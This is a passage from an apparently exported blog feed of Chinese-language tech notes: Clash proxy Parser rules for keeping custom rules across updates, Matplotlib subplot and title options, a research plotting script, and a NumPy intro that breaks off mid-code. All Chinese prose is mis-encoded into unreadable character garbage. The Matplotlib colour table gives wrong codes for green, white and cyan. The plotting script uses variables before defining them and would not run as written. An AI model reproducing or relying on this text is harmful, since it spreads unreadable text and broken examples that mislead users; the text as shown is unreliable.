        <content type="html"><![CDATA[<h2 id="å¸¸ç”¨é€‰é¡¹">å¸¸ç”¨é€‰é¡¹</h2><ol type="1"><li><p>å¼€å¯ General ä¸‹çš„ Allow LANï¼Œ Mixinï¼Œ System Proxyï¼Œ Start withWindows</p><p>Allow LAN: å…è®¸å±€åŸŸç½‘è”æœºï¼Œä½¿ç”¨è™šæ‹Ÿæœºæ—¶ç›´æ¥å±€åŸŸç½‘ä»£ç† Mixinï¼šä¸åŒåè®®ç«¯å£æ··åˆéƒ½ç”¨ä¸€ä¸ªç«¯å£</p></li><li><p>Pofiles ä¸‹çš„é…ç½®ï¼Œå³é”®é€‰æ‹© settingï¼Œå°† Update Intervalè®¾ç½®ä¸ºæœ€å°æ•´æ•° 1,</p><p>æœ‰æ—¶å€™æ›´æ–°ç¨å¾®ä¸€æ…¢ï¼ŒèŠ‚ç‚¹å°±ä¸è¡Œäº†ï¼Œå‹¤æ›´æ–°</p></li></ol><h2 id="clash-ä½¿ç”¨-parser-æ·»åŠ è‡ªå®šä¹‰è§„åˆ™å¹¶é˜²æ­¢æ›´æ–°è¦†ç›–">Clash ä½¿ç”¨Parser æ·»åŠ è‡ªå®šä¹‰è§„åˆ™å¹¶é˜²æ­¢æ›´æ–°è¦†ç›–</h2><p>IEEEæœ‰æ—¶å€™å›½å†…è¿ä¸ä¸Šï¼Œéœ€è¦ä¸Šå¤–ç½‘ï¼Œä½†æ˜¯è®¢é˜…çš„è§„åˆ™é‡Œé¢å°†å…¶å†™ä¸ºäº†ç›´è¿ï¼Œæ¯ä¸€æ¬¡æ›´æ–°è®¢é˜…èŠ‚ç‚¹ï¼Œæˆ‘è‡ªå®šä¹‰è§„åˆ™å°±ä¼šè¢«è¦†ç›–ï¼Œé€ æˆè§„åˆ™ä¸¢å¤±ï¼Œå› æ­¤æ‰¾åˆ°è¿™ä¸ªæ–¹æ³•ã€‚</p><ol type="1"><li><p>æ‰“å¼€ <code>Setting</code>ï¼ˆè®¾ç½®ï¼‰ï¼Œæ‰¾åˆ°<code>Profiles</code>ï¼ˆé…ç½®æ–‡ä»¶ä¸‹ï¼‰çš„ <code>Parsers</code></p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20220702230529.png"alt="20220702230529" /><figcaption aria-hidden="true">20220702230529</figcaption></figure></li><li><p>ç‚¹å‡»å³ä¾§çš„ <code>Edit</code>ï¼Œæ‰“å¼€ç¼–è¾‘ç•Œé¢ã€‚</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20220702230419.png"alt="20220702230419" /><figcaption aria-hidden="true">20220702230419</figcaption></figure><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">parsers: # array</span><br><span class="line">    - url: https://xxx</span><br><span class="line">    yaml:</span><br><span class="line">        prepend-rules:</span><br><span class="line">            - DOMAIN-SUFFIX,ieee.org,DIRECT</span><br></pre></td></tr></table></figure></p><p>urlï¼šæ”¹æˆæœ¬äººçš„è®¢é˜…åœ°å€ï¼Œå¦‚æœä¸çŸ¥é“ï¼Œå¯ä»¥ç›´æ¥åœ¨ Profilesä¸‹ç‚¹å‡»å½“å‰è®¢é˜…çš„ settingsï¼Œå¤åˆ¶å…¶ä¸­çš„ URL å³å¯ã€‚prepen-rulesï¼šæ­¤å¤„æ·»åŠ ä½ çš„è‡ªå®šä¹‰è§„åˆ™ï¼Œæ¯ä¸€æ¡å ä¸€è¡Œï¼ŒæŒ‰ç…§ï¼ˆè§„åˆ™ç±»å‹ï¼Œå€¼ï¼Œä»£ç†ç­–ç•¥ï¼‰æ’åˆ—ï¼Œä½¿ç”¨é€—å·åˆ†éš”ã€‚æ³¨æ„çš„æ˜¯ï¼Œæ¯ä¸€è¡Œéƒ½éœ€è¦ä»¥ä¸€ä¸ªçŸ­æ¨ªçº¿åŠ ç©ºæ ¼çš„å¼€å¤´ï¼ŒåŒæ—¶æ³¨æ„å¯¹é½ã€‚å…·ä½“çš„è‡ªå®šä¹‰è§„åˆ™å¦‚ä½•ä¹¦å†™åœ¨æœ¬æ–‡çš„ååŠéƒ¨åˆ†æœ‰è¯´æ˜ã€‚ç¼–è¾‘å®Œæˆåï¼Œç‚¹å‡»å³ä¸‹è§’ä¿å­˜ã€‚åˆ° Profilesé‡Œæ›´æ–°è®¢é˜…ï¼Œè¿™æ ·å°±å¯ä»¥å°†æ–°çš„è§„åˆ™æ·»åŠ ä¸Šäº†ã€‚å¯ä»¥ç‚¹å‡» edit rulesæŸ¥çœ‹è§„åˆ™è¿›è¡ŒéªŒè¯ã€‚ä¹‹åæ‰“å¼€ç›¸åº”ç½‘é¡µçœ‹æ˜¯å¦ç”Ÿæ•ˆã€‚</p></li><li><p>ä»£ç†ç­–ç•¥çš„é€‰æ‹©</p><p>ä¸€èˆ¬æƒ…å†µæˆ‘ä»¬ä½¿ç”¨ DIRECTï¼ŒGLOBALï¼ŒREJECTã€‚DIRECTè¡¨ç¤ºä¸èµ°ä»£ç†ï¼Œå³ä¸é€šè¿‡ä»£ç†èŠ‚ç‚¹ç›´æ¥è¿æ¥ã€‚GLOBALåˆ™æ˜¯èµ°å…¨å±€ä»£ç†èŠ‚ç‚¹ã€‚REJECT åˆ™è¡¨ç¤ºç¦æ­¢è¿æ¥ï¼Œä½¿ç”¨ REJECTåï¼Œå°†ä¼šå±è”½å¯¹åº”ç½‘ç«™ã€‚</p><p>æœ‰ä¸€äº›è®¢é˜…è¿˜æä¾›äº†å¾ˆå¤šè‡ªåˆ¶çš„ç­–ç•¥ï¼Œå¯ä»¥è‡ªè¡Œå°è¯•ã€‚ä½¿ç”¨æ—¶ç›´æ¥è¾“å…¥åå­—å³å¯ï¼Œä¸­æ–‡ä¹Ÿæ˜¯æ”¯æŒçš„ã€‚</p><p>ç‚¹å‡» Generalï¼Œç‚¹å‡» Home Directory ä¸‹çš„ OpenFolderï¼Œæ‰“å¼€é…ç½®æ–‡ä»¶å¤¹ï¼Œç‚¹å‡» Profiles æ–‡ä»¶å¤¹ï¼Œæ‰¾åˆ°å¯¹åº”çš„ ymlæ–‡ä»¶ï¼Œç”¨è®°äº‹æœ¬ç­‰è½¯ä»¶æ‰“å¼€ï¼Œç›´æ¥å¤åˆ¶ç²˜è´´å°±å¯ä»¥å•¦ æˆ–è€… Profiles ä¸‹ç‚¹å‡» EditExternally ä¾¿å¯ä»¥ã€‚</p></li><li><p>åŸç†ä»‹ç»</p><p>Parser åŠŸèƒ½æ˜¯é…ç½®æ–‡ä»¶è¿›è¡Œé¢„å¤„ç†ï¼Œå› æ­¤ï¼Œæ¯ä¸€æ¬¡æ›´æ–°éƒ½ä¼šæ‰§è¡Œä¸€æ¬¡Parserï¼Œå› æ­¤è‡ªå®šä¹‰è§„åˆ™ä¼šæ°¸è¿œå­˜åœ¨ï¼Œåªè¦ä½ ä¸åˆ é™¤ Parserã€‚</p></li></ol><h1 id="å‚è€ƒ">å‚è€ƒ</h1><p><a href="https://chenjuefei.com:444/117.html">Clash ä½¿ç”¨ Parseræ·»åŠ è‡ªå®šä¹‰è§„åˆ™å¹¶é˜²æ­¢æ›´æ–°è¦†ç›– - è§‰ä»Šæ˜¯è€Œæ˜¨é - Blog</a></p>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Matplotlib åº“-ç®€ä»‹ä¸ç»˜åˆ¶å­å›¾</title>
      <link href="/blog/2022/06/25/programming/python/ai/plot_subplot/"/>
      <url>/blog/2022/06/25/programming/python/ai/plot_subplot/</url>
      
        <content type="html"><![CDATA[<p>å¯¼å…¥ Matplotlib åº“ä¸­çš„ pyplot å­åº“<code>import matplotlib.pyplot as plt</code></p><h2 id="ä½¿ç”¨-figure-å¯¹è±¡ä½œä¸ºç”»å¸ƒç”»å›¾">ä½¿ç”¨ Figure å¯¹è±¡ä½œä¸ºç”»å¸ƒç”»å›¾</h2><p>figure(num,figsize,dpi,facecolor,edgecolor,frameon) num:å›¾å½¢ç¼–å·æˆ–åç§°ï¼Œå–å€¼ä¸ºæ•°å­—/å­—ç¬¦ä¸² figsizeï¼šç»˜ç”»å¯¹è±¡çš„å®½å’Œé«˜ï¼Œå•ä½ä¸ºè‹±å¯¸dpiï¼šç»˜å›¾å¯¹è±¡çš„åˆ†è¾¨ç‡ï¼Œç¼ºçœä¸º 80 facecolorï¼šèƒŒæ™¯é¢œè‰² edgecolorï¼šè¾¹æ¡†é¢œè‰²frameonï¼šè¡¨ç¤ºæ˜¯å¦æ˜¾ç¤ºè¾¹æ¡†</p><table><thead><tr class="header"><th>é¢œè‰²</th><th>ç¼©ç•¥å­—ç¬¦</th><th>é¢œè‰²</th><th>ç¼©ç•¥å­—ç¬¦</th></tr></thead><tbody><tr class="odd"><td>blue</td><td>b</td><td>black</td><td>k</td></tr><tr class="even"><td>green</td><td>9</td><td>white</td><td>W</td></tr><tr class="odd"><td>red</td><td>r</td><td>cyan</td><td>C</td></tr><tr class="even"><td>yellow</td><td>y</td><td>magenta</td><td>m</td></tr></tbody></table><h2 id="å­å›¾">å­å›¾</h2><p><code>subplot(è¡Œæ•°ï¼Œåˆ—æ•°ï¼Œå­å›¾åºå·)</code>å­å›¾åºå·ç¼–å·è§„å®šï¼šä»å·¦åˆ°å³ï¼Œä»ä¸Šåˆ°ä¸‹ã€‚ <imgsrc="media/16151198206029/16151219472361.jpg" /></p><p>æ¯ä¸ª subplot åªåˆ›å»ºä¸€ä¸ªå­å›¾</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">plt.subplot(<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line">plt.subplot(<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line">plt.subplot(<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line">plt.subplot(<span class="number">2</span>,<span class="number">2</span>,<span class="number">4</span>)</span><br></pre></td></tr></table></figure><p>è®¾ç½®ä¸­æ–‡å­—ä½“:<code>plt.rcParams["font.sans-serif"]="SimHei"</code></p><p>Mac ä¸‹å¯ä»¥ç”¨ä»¥ä¸‹ä»£ç æŸ¥çœ‹ matplotlib å¯ä»¥ä½¿ç”¨çš„å­—ä½“, æˆ‘æ˜¯ç”¨ "PingFangHK" å­—ä½“ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from matplotlib import font_manager</span><br><span class="line">font_set = &#123;f.name for f in font_manager.fontManager.ttflist&#125;</span><br><span class="line">for f in font_set:</span><br><span class="line">    print(f)</span><br></pre></td></tr></table></figure><table><thead><tr class="header"><th>ä¸­æ–‡å­—ä½“</th><th>è‹±æ–‡æè¿°</th><th>ä¸­æ–‡å­—ä½“</th><th>è‹±æ–‡æè¿°</th></tr></thead><tbody><tr class="odd"><td>å®‹ä½“</td><td>SimSun</td><td>æ¥·ä½“</td><td>KaiTi</td></tr><tr class="even"><td>é»‘ä½“</td><td>SimHei</td><td>ä»¿å®‹</td><td>FangSong</td></tr><tr class="odd"><td>å¾®è½¯é›…é»‘</td><td>Microsoft YaHei</td><td>éš¶ä¹¦</td><td>LiSu</td></tr><tr class="even"><td>å¾®è½¯æ­£é»‘ä½“</td><td>Microsoft JhengHei</td><td>å¹¼åœ†</td><td>YouYuan</td></tr></tbody></table><p>æ¢å¤æ ‡å‡†é»˜è®¤é…ç½®ï¼š<code>plt.rcdefaults()</code></p><h2 id="æ ‡é¢˜">æ ‡é¢˜</h2><p>æ·»åŠ å…¨å±€æ ‡é¢˜ï¼š<code>suptitle(æ ‡é¢˜æ–‡å­—)</code>æ·»åŠ å­æ ‡é¢˜ï¼š<code>title(æ ‡é¢˜æ–‡å­—)</code></p><p>suptitle å‡½æ•°å‚æ•°ï¼š</p><table><thead><tr class="header"><th>å‚æ•°</th><th>è¯´æ˜</th><th>é»˜è®¤å€¼</th></tr></thead><tbody><tr class="odd"><td>X</td><td>æ ‡é¢˜ä½ç½®çš„ x åæ ‡</td><td>0.5</td></tr><tr class="even"><td>y</td><td>æ ‡é¢˜ä½ç½®çš„ y åæ ‡</td><td>0.98</td></tr><tr class="odd"><td>color</td><td>æ ‡é¢˜é¢œè‰²</td><td>é»‘è‰²</td></tr><tr class="even"><td>backgroundcolor</td><td>æ ‡é¢˜èƒŒæ™¯é¢œè‰²</td><td>12</td></tr><tr class="odd"><td>fontsize</td><td>æ ‡é¢˜çš„å­—ä½“å¤§å°</td><td></td></tr><tr class="even"><td>fontweight</td><td>å­—ä½“ç²—ç»†</td><td>normal</td></tr><tr class="odd"><td>fontstyle</td><td>è®¾ç½®å­—ä½“ç±»å‹</td><td></td></tr><tr class="even"><td>horizontalalignment</td><td>æ ‡é¢˜æ°´å¹³å¯¹é½æ–¹å¼</td><td>center</td></tr><tr class="odd"><td>verticalalignment</td><td>æ ‡é¢˜çš„å‚ç›´å¯¹é½æ–¹å¼</td><td>top</td></tr></tbody></table><table><thead><tr class="header"><th>fontsize</th><th>fontweight</th></tr></thead><tbody><tr class="odd"><td>xx-small</td><td>light</td></tr><tr class="even"><td>x-small</td><td>normal</td></tr><tr class="odd"><td>small</td><td>medium</td></tr><tr class="even"><td>medium</td><td>semibold</td></tr><tr class="odd"><td>large</td><td>bold</td></tr><tr class="even"><td>x-large</td><td>heavy</td></tr><tr class="odd"><td>xx-large</td><td>black</td></tr></tbody></table><p>title() å‡½æ•°å‚æ•°ï¼š</p><table><thead><tr class="header"><th>å‚æ•°</th><th>è¯´æ˜</th><th>å–å€¼</th></tr></thead><tbody><tr class="odd"><td>loc</td><td>æ ‡é¢˜ä½ç½®</td><td>left, right</td></tr><tr class="even"><td>rotation</td><td>æ ‡é¢˜æ–‡å­—æ—‹è½¬è§’åº¦</td><td></td></tr><tr class="odd"><td>color</td><td>æ ‡é¢˜é¢œè‰²</td><td>é»‘è‰²</td></tr><tr class="even"><td>fontsize</td><td>æ ‡é¢˜çš„å­—ä½“å¤§å°</td><td></td></tr><tr class="odd"><td>fontweight</td><td>å­—ä½“ç²—ç»†</td><td>normal</td></tr><tr class="even"><td>fontstyle</td><td>è®¾ç½®å­—ä½“ç±»å‹</td><td></td></tr><tr class="odd"><td>horizontalalignment</td><td>æ ‡é¢˜æ°´å¹³å¯¹é½æ–¹å¼</td><td>center</td></tr><tr class="even"><td>_verticalalignment</td><td>æ ‡é¢˜çš„å‚ç›´å¯¹é½æ–¹å¼</td><td>top</td></tr><tr class="odd"><td>fontdict</td><td>è®¾ç½®å‚æ•°å­—å…¸</td><td></td></tr></tbody></table><p>tight_layout(rect=[left, bottom, right, top])å‡½æ•°æ£€æŸ¥åæ ‡è½´æ ‡ç­¾ã€åˆ»åº¦æ ‡ç­¾ã€å’Œå­å›¾æ ‡é¢˜ï¼Œè‡ªåŠ¨è°ƒæ•´å­å›¾ï¼Œä½¿ä¹‹å¡«å……<strong>æ•´ä¸ª</strong>ç»˜å›¾åŒºåŸŸ(ä¼šå½±å“å…¨å±€æ ‡é¢˜)ï¼Œå¹¶æ¶ˆé™¤å­å›¾ä¹‹é—´çš„é‡å ã€‚</p><h2 id="å‚è€ƒæ¨è">å‚è€ƒæ¨è</h2><ol type="1"><li><a href="https://zhuanlan.zhihu.com/p/139052035">matplotlib.pyplotçš„ä½¿ç”¨æ€»ç»“å¤§å…¨ï¼ˆå…¥é—¨åŠ è¿›é˜¶ï¼‰</a></li><li><a href="https://dwy6626.github.io/post/matplotlib-font/">Matplotlibä¸­æ–‡å­—é«”äº‚ç¢¼å•é¡Œ</a></li><li><a href="https://mshk.top/2019/08/macos-matplotlib/">MacOS è®¾ç½®ä¸‹matplotlib æ˜¾ç¤ºä¸­æ–‡</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>matplotlib ä¹‹ç§‘ç ”å¸¸ç”¨ç”»å›¾ä»£ç </title>
      <link href="/blog/2022/06/24/programming/python/ai/plot_academaic/"/>
      <url>/blog/2022/06/24/programming/python/ai/plot_academaic/</url>
      
        <content type="html"><![CDATA[<h2 id="å®Œæ•´ä»£ç ">å®Œæ•´ä»£ç </h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line"></span><br><span class="line">folder_name = f&quot;plot/c&#123;cost_value&#125;logs.txt&quot;</span><br><span class="line">tpl = np.loadtxt(folder_name, delimiter=&#x27; &#x27;,unpack=True) # è¯»å–ä¸€è¡Œ</span><br><span class="line">dc_data[cost_value] = tpl[-3]</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    plt.rcParams[&#x27;xtick.direction&#x27;] = &#x27;in&#x27;  # å°†xå‘¨çš„åˆ»åº¦çº¿æ–¹å‘è®¾ç½®å‘å†…</span><br><span class="line">    plt.rcParams[&#x27;ytick.direction&#x27;] = &#x27;in&#x27;  # å°†yè½´çš„åˆ»åº¦çº¿æ–¹å‘è®¾ç½®å‘å†…</span><br><span class="line">    plt.rcParams[&#x27;font.sans-serif&#x27;] = [&#x27;Times New Roman&#x27;] # è®¾ç½®å­—ä½“</span><br><span class="line">    plt.rcParams[&#x27;figure.figsize&#x27;] = (12, 10) # è®¾ç½®å›¾ç‰‡å¤§å°</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    cost_values = [&quot;1.5&quot;, &quot;1&quot;, &quot;0.5&quot;, &quot;0.1&quot;]</span><br><span class="line">    x_tick = np.array([2, 3, 4, 5, 6, 7, 8, 9], dtype=int)</span><br><span class="line">    types = [f&quot;$c$=&#123;cost_value&#125;&quot; for cost_value in cost_values]</span><br><span class="line"></span><br><span class="line">    dc_data, fig_name, (xlabel, ylabel), ylim_tuple = quality(</span><br><span class="line">        cost_values)</span><br><span class="line"></span><br><span class="line">    markers = [&#x27;&gt;&#x27;, &#x27;x&#x27;, &#x27;o&#x27;, &quot;d&quot;]</span><br><span class="line">    for idx, cost_value in enumerate(cost_values):</span><br><span class="line">        plt.plot(x_tick, dc_data[cost_value],</span><br><span class="line">                 label=types[idx], marker=markers[idx], linewidth=3, markersize=12, markeredgewidth=5)</span><br><span class="line"></span><br><span class="line">    plt.xlabel(xlabel, fontsize=30)  # æ¨ªåæ ‡åå­—</span><br><span class="line">    plt.ylabel(ylabel, fontsize=30)  # çºµåæ ‡åå­—</span><br><span class="line">    plt.xticks(fontproperties=&#x27;Times New Roman&#x27;, size=23) # è®¾ç½® tick å±æ€§</span><br><span class="line">    plt.yticks(fontproperties=&#x27;Times New Roman&#x27;, size=23)</span><br><span class="line">    plt.legend(loc=&quot;best&quot;, ncol=2, prop=&#123;</span><br><span class="line">               &#x27;family&#x27;: &#x27;Times New Roman&#x27;, &#x27;size&#x27;: 23&#125;) # è®¾ç½®å›¾ä¾‹å±æ€§</span><br><span class="line">    plt.grid() # è®¾ç½®x y è½´ç½‘æ ¼</span><br><span class="line">    plt.xlim(2, 9)</span><br><span class="line">    # plt.semilogy()  # yè½´å–å¯¹æ•°</span><br><span class="line">    plt.ylim(ylim_tuple)  # é™åˆ¶yè½´é•¿åº¦ 0.9*1e5, 1.0*1e5</span><br><span class="line">    plt.savefig(fig_name, dpi=300, bbox_inches=&#x27;tight&#x27;)</span><br><span class="line">    # plt.show()</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="0" type="1"><li>numpy è¯»å–æ•°æ®ï¼Œæ–¹ä¾¿å¿«æ·ï¼ŒåæœŸå¤„ç†ä¹Ÿæ–¹ä¾¿</li><li>åˆ»åº¦çº¿å‘å†…</li><li>è®¾ç½®å­—ä½“</li><li>y è½´å›¾åƒ/æŠ˜çº¿é—´éš”è¿‡åº¦ç¨€ç–æˆ–ç¨ å¯†ï¼Œå¯¹ y è½´å–å¯¹æ•°</li><li>å¯¹æŠ˜çº¿æˆ–è€…æŸ±çŠ¶å›¾è®¾ç½® marker åŠå…¶å¤§å°ï¼Œçœ‹èµ·æ¥å†…å®¹æ›´å……è¶³</li><li>è®¾ç½® y è½´çš„èŒƒå›´ï¼Œæ‹‰é•¿æˆ–è€…ç¼©çŸ­ y è½´</li><li><code>plt.savefig('fig.png',dpi=300, bbox_inches='tight')</code> ä»¥dpi 300 çš„æ¸…æ™°åº¦ä¿å­˜å›¾ç‰‡ï¼ŒåŒæ—¶é€šè¿‡ <code>bbox_inches='tight'</code>é€‰é¡¹è®¾ç½®å»é™¤å›¾ç‰‡å››å‘¨æ— ç”¨ç©ºç™½</li></ol><p>æ³¨ï¼š <code>plt.tight_layout()</code> ä¸ç»å¸¸æœ‰ç”¨ï¼Œåªç”¨<code>bbox_inches='tight'</code> å³å¯ã€‚</p><p><ahref="https://stackoverflow.com/questions/35393863/matplotlib-error-figure-includes-axes-that-are-not-compatible-with-tight-layou">python- Matplotlib Error: "figure includes Axes that are not compatible withtight_layout" - Stack Overflow</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>numpy å…¥é—¨</title>
      <link href="/blog/2022/06/15/programming/python/ai/np_intro/"/>
      <url>/blog/2022/06/15/programming/python/ai/np_intro/</url>
      
        <content type="html"><![CDATA[<h1 id="numpy-åº“">numpy åº“</h1><h2 id="ç®€ä»‹">ç®€ä»‹</h2><ol type="1"><li>æä¾›äº†å¤šç»´æ•°ç»„ã€çŸ©é˜µçš„å¸¸ç”¨æ“ä½œå’Œä¸€äº›é«˜æ•ˆçš„ç§‘å­¦è®¡ç®—å‡½æ•°ã€‚</li><li>åº•å±‚è¿ç®—é€šè¿‡ Cè¯­è¨€å®ç°ï¼Œå¤„ç†é€Ÿåº¦å¿«ã€æ•ˆç‡é«˜ï¼Œé€‚ç”¨äºå¤§è§„æ¨¡å¤šç»´æ•°ç»„ã€‚</li><li>å¯ä»¥ç›´æ¥å®Œæˆæ•°ç»„å’ŒçŸ©é˜µè¿ç®—ï¼Œæ— éœ€å¾ªç¯ã€‚</li></ol><h2 id="å¤šç»´æ•°ç»„">å¤šç»´æ•°ç»„</h2><p>å½¢çŠ¶(Shape):æ˜¯ä¸€ä¸ªå…ƒç»„,æè¿°æ•°ç»„çš„ç»´åº¦,ä»¥åŠå„ä¸ªç»´åº¦çš„é•¿åº¦ã€‚é•¿åº¦(Length):æŸä¸ªç»´åº¦ä¸­çš„å…ƒç´ ä¸ªæ•°ã€‚ shape(5,) é•¿åº¦ä¸º 5 çš„ä¸€ç»´æ•°ç»„ï¼Œshape(30,5) 30x5 çš„äºŒç»´æ•°ç»„ï¼Œshape(10, )</p><p>NumPy æ•°ç»„ â˜… æ¯ä¸ªæ•°ç»„éƒ½æ˜¯ä¸€ä¸ª ndarray å¯¹è±¡ â˜… æ•°ç»„ä¸­çš„å…ƒç´ æ•°æ®ç±»å‹ç›¸åŒâ˜… æ•°ç»„ä¸­çš„å…ƒç´ ä¸‹æ ‡ä» 0 å¼€å§‹ â˜…æ•°ç»„å¯¹è±¡çš„å¸¸ç”¨å±æ€§ï¼šç»´æ•°ã€å½¢çŠ¶ã€æ•°æ®ç±»å‹ç­‰ã€‚</p><h3 id="æ•°ç»„åˆ›å»º">æ•°ç»„åˆ›å»º</h3><p>array([list]/(tuple)) å®šä¹‰æ•°ç»„æ—¶ï¼Œå¯ä»¥æŒ‡å®š dtype æ•°æ®ç±»å‹:array([list]/(tuple)ï¼Œdtype=æ•°æ®ç±»å‹)</p><p>asarray() å‡½æ•°ï¼šå°†åˆ—è¡¨æˆ–å…ƒç»„è½¬åŒ–ä¸ºæ•°ç»„å¯¹è±¡</p><p>å½“æ•°æ®æºæœ¬èº«å·²ç»æ˜¯ä¸€ä¸ª ndarray å¯¹è±¡æ—¶, array()ä»ç„¶ä¼šå¤åˆ¶å‡ºä¸€ä¸ªå‰¯æœ¬,è€Œ asarray() åˆ™ç›´æ¥å¼•ç”¨äº†æœ¬æ¥çš„æ•°ç»„ã€‚</p><h3 id="æ•°ç»„å±æ€§">æ•°ç»„å±æ€§</h3><table><thead><tr class="header"><th>å±æ€§</th><th>æè¿°</th></tr></thead><tbody><tr class="odd"><td>ndim</td><td>æ•°ç»„çš„ç»´æ•°</td></tr><tr class="even"><td>shape</td><td>æ•°ç»„çš„å½¢çŠ¶</td></tr><tr class="odd"><td>size</td><td>æ•°ç»„å…ƒç´ çš„æ€»ä¸ªæ•°</td></tr><tr class="even"><td>dtype</td><td>æ•°ç»„ä¸­å…ƒç´ çš„æ•°æ®ç±»å‹</td></tr><tr class="odd"><td>itemsize</td><td>æ•°ç»„ä¸­æ¯ä¸ªå…ƒç´ çš„å­—èŠ‚æ•°</td></tr></tbody></table><h3 id="ç‰¹æ®Šæ•°ç»„">ç‰¹æ®Šæ•°ç»„</h3><table><thead><tr class="header"><th>å‡½ æ•°</th><th>åŠŸèƒ½æè¿°</th></tr></thead><tbody><tr class="odd"><td>np.arange()</td><td>åˆ›å»ºæ•°å­—åºåˆ—æ•°ç»„</td></tr><tr class="even"><td>np.ones()</td><td>åˆ›å»ºå…¨ 1 æ•°ç»„</td></tr><tr class="odd"><td>np.zeros()</td><td>åˆ›å»ºå…¨ 0 æ•°ç»„</td></tr><tr class="even"><td>np.eye()</td><td>åˆ›å»ºå•ä½çŸ©é˜µ</td></tr><tr class="odd"><td>np.linspace()</td><td>åˆ›å»ºç­‰å·®æ•°åˆ—</td></tr><tr class="even"><td>np.logspace()</td><td>åˆ›å»ºç­‰æ¯”æ•°åˆ—</td></tr></tbody></table><ol type="1"><li>arange() å‡½æ•°ï¼šåˆ›å»ºä¸€ä¸ªç”±æ•°å­—åºåˆ—æ„æˆçš„æ•°ç»„(æ­¥é•¿å¯ä¸ºå°æ•°)ï¼Œç±»ä¼¼äºrange() <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">np.arange(èµ·å§‹æ•°å­—ï¼Œç»“æŸæ•°å­—ï¼Œæ­¥é•¿ï¼Œdtype=æ•°æ®ç±»å‹)</span><br><span class="line">np.arange(<span class="number">4</span>)</span><br><span class="line">np.arange(<span class="number">0</span>,<span class="number">2</span>,<span class="number">0.2</span>)</span><br></pre></td></tr></table></figure></li><li>ones() å‡½æ•°ï¼šåˆ›å»ºä¸€ä¸ªå…ƒç´ å…¨éƒ¨ä¸º 1 çš„æ•°ç»„ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">np.ones(shape, dtype=æ•°æ®ç±»å‹)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.ones((<span class="number">3</span>,<span class="number">2</span>),dtype=np.int32)</span><br><span class="line">array([[<span class="number">1</span>, <span class="number">1</span>],</span><br><span class="line">   [<span class="number">1</span>, <span class="number">1</span>],</span><br><span class="line">   [<span class="number">1</span>, <span class="number">1</span>]], dtype=int32)</span><br><span class="line"><span class="comment"># é»˜è®¤æ˜¯ float64 ç±»å‹</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.ones((<span class="number">3</span>,<span class="number">2</span>))</span><br><span class="line">array([[<span class="number">1.</span>, <span class="number">1.</span>],</span><br><span class="line">       [<span class="number">1.</span>, <span class="number">1.</span>],</span><br><span class="line">       [<span class="number">1.</span>, <span class="number">1.</span>]])</span><br></pre></td></tr></table></figure></li><li>zeros() å‡½æ•°ï¼Œnp.zeros(shape, dtype=æ•°æ®ç±»å‹)</li><li>eye() å‡½æ•°ï¼Œnp.eye(shape) shape ä¸ç”¨å•ç‹¬åŠ å…ƒç»„æ‹¬å·</li><li>linspace()å‡½æ•° <code>np.linspace(start, stop, num)</code> åŒºé—´[start, stop]ä¸­ num ä¸ªæ•°</li><li>logspace() å‡½æ•° <code>np.logspace(start, stop, num, base)</code>åŒºé—´ [base^start, base^stop]ä¸­ num ä¸ªæ•°</li></ol><h2 id="æ•°ç»„åˆ‡ç‰‡">æ•°ç»„åˆ‡ç‰‡</h2><p>äºŒç»´æ•°ç»„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 